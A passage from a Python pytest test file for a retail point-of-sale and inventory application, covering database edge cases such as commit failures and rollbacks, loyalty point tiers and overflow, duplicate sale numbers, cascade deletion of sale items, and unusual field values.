    def test_commit_failure_handling(self, mock_commit, session, basic_setup):
        """Test handling of commit failures."""
        mock_commit.side_effect = Exception('Simulated commit failure')

        product = basic_setup['product']
        original_name = product.name
        product.name = 'Should Fail'

        try:
            session.commit()
            assert False, "Should have raised exception"
        except Exception as e:
            session.rollback()
            assert 'Simulated commit failure' in str(e)

    def test_transaction_rollback_on_error(self, session, basic_setup):
        """Test that transactions rollback properly on error."""
        product = basic_setup['product']
        original_quantity = product.quantity

        try:
            # Start modifying
            product.quantity = 200

            # Simulate an error before commit
            raise ValueError("Simulated error during transaction")

        except ValueError:
            session.rollback()

        # Refresh from database
        session.refresh(product)

        # Quantity should be unchanged
        assert product.quantity == original_quantity


# =============================================================================
# 11. LOYALTY POINTS OVERFLOW TESTS
# =============================================================================

class TestLoyaltyPointsOverflow:
    """Tests for loyalty points edge cases and overflow."""

    def test_loyalty_points_near_overflow(self, session):
        """Test loyalty points near integer overflow."""
        max_int = 2147483647  # Max 32-bit signed int

        customer = Customer(
            name='Max Points Customer',
            phone='0300-5555555',
            loyalty_points=max_int - 100
        )
        session.add(customer)
        session.commit()

        # Adding more points should work (database dependent)
        points_earned = customer.add_loyalty_points(10000)  # Adds 100 points
        session.commit()

        # Check tier calculation still works
        assert customer.loyalty_tier == 'Platinum'

    def test_loyalty_tier_transitions(self, session):
        """Test all loyalty tier boundary transitions."""
        boundaries = [
            (0, 'Bronze'),
            (499, 'Bronze'),
            (500, 'Silver'),
            (999, 'Silver'),
            (1000, 'Gold'),
            (2499, 'Gold'),
            (2500, 'Platinum'),
            (5000, 'Platinum'),
        ]

        for points, expected_tier in boundaries:
            customer = Customer(
                name=f'Tier {points} Customer',
                phone=f'0300-{points:07d}',
                loyalty_points=points
            )
            session.add(customer)
            session.commit()

            assert customer.loyalty_tier == expected_tier, \
                f"Expected {expected_tier} at {points} points, got {customer.loyalty_tier}"

    def test_negative_loyalty_points_prevention(self, session):
        """Test that loyalty points cannot become negative through redemption."""
        customer = Customer(
            name='Negative Test Customer',
            phone='0300-4444444',
            loyalty_points=150
        )
        session.add(customer)
        session.commit()

        # Try to redeem more than available
        success, _ = customer.redeem_points(200)
        assert success is False
        assert customer.loyalty_points == 150


# =============================================================================
# 12. ADDITIONAL EDGE CASES
# =============================================================================

class TestAdditionalEdgeCases:
    """Additional edge case tests."""

    def test_duplicate_sale_number_prevention(self, session, basic_setup):
        """Test that duplicate sale numbers are rejected."""
        user = basic_setup['user']
        kiosk = basic_setup['kiosk']

        sale1 = Sale(
            sale_number='SALE-DUP-001',
            user_id=user.id,
            location_id=kiosk.id,
            subtotal=Decimal('100.00'),
            total=Decimal('100.00'),
            payment_method='cash',
            status='completed'
        )
        session.add(sale1)
        session.commit()

        # Try to create duplicate
        sale2 = Sale(
            sale_number='SALE-DUP-001',  # Same number
            user_id=user.id,
            location_id=kiosk.id,
            subtotal=Decimal('200.00'),
            total=Decimal('200.00'),
            payment_method='cash',
            status='completed'
        )
        session.add(sale2)

        with pytest.raises(Exception):  # IntegrityError
            session.commit()
        session.rollback()

    def test_orphaned_sale_items(self, session, basic_setup):
        """Test handling of sale items when sale is deleted."""
        user = basic_setup['user']
        product = basic_setup['product']
        kiosk = basic_setup['kiosk']

        sale = Sale(
            sale_number='SALE-ORPHAN-001',
            user_id=user.id,
            location_id=kiosk.id,
            subtotal=Decimal('100.00'),
            total=Decimal('100.00'),
            payment_method='cash',
            status='completed'
        )
        session.add(sale)
        session.flush()

        item = SaleItem(
            sale_id=sale.id,
            product_id=product.id,
            quantity=1,
            unit_price=Decimal('100.00'),
            subtotal=Decimal('100.00')
        )
        session.add(item)
        session.commit()

        sale_id = sale.id

        # Delete sale - items should cascade delete
        session.delete(sale)
        session.commit()

        # Items should be gone
        orphans = SaleItem.query.filter_by(sale_id=sale_id).all()
        assert orphans == []

    def test_self_referencing_transfer(self, session, basic_setup):
        """Test transfer to same location (edge case)."""
        kiosk = basic_setup['kiosk']
        user = basic_setup['user']

        # Create transfer to same location
        transfer = StockTransfer(
            transfer_number='TRF-SELF-001',
            source_location_id=kiosk.id,
            destination_location_id=kiosk.id,  # Same location
            status='draft',
            requested_by=user.id
        )
        session.add(transfer)
        session.commit()

        # Model allows it - validation should be at business logic level
        assert transfer.source_location_id == transfer.destination_location_id

    def test_product_with_all_null_optionals(self, session, basic_setup):
        """Test product with all optional fields as null."""
        category = basic_setup['category']

        product = Product(
            code='PROD-NULL-001',
            name='Minimal Product',
            category_id=category.id,
            cost_price=Decimal('100.00'),
            selling_price=Decimal('150.00'),
            quantity=10,
            # All optional fields left as None/default
            barcode=None,
            brand=None,
            description=None,
            size=None,
            image_url=None,
            batch_number=None,
            expiry_date=None,
            is_active=True
        )
        session.add(product)
        session.commit()

        retrieved = Product.query.get(product.id)
        assert retrieved.barcode is None
        assert retrieved.brand is None
        assert retrieved.description is None

    def test_whitespace_only_fields(self, session):
        """Test fields with only whitespace."""
        customer = Customer(
            name='   ',  # Whitespace only name (edge case)
            phone='0300-3333333',
            email='   ',
            address='    '
        )
        session.add(customer)
        session.commit()

        # Database stores as-is, validation should be at app level
        assert customer.name == '   '

    def test_very_old_date(self, session, basic_setup):
        """Test handling of very old dates."""
        old_date = datetime(1900, 1, 1, 0, 0, 0)

        sale = Sale(
            sale_number='SALE-OLD-001',
            user_id=basic_setup['user'].id,
            location_id=basic_setup['kiosk'].id,
            subtotal=Decimal('100.00'),
            total=Decimal('100.00'),
            payment_method='cash',
            sale_date=old_date,
            status='completed'
        )
        session.add(sale)
        session.commit()

        retrieved = Sale.query.get(sale.id)
        assert retrieved.sale_date.year == 1900


# =============================================================================
# RUN TESTS
# =============================================================================

if __name__ == '__main__':
    pytest.main([__file__, '-v', '--tb=short', '-x'])
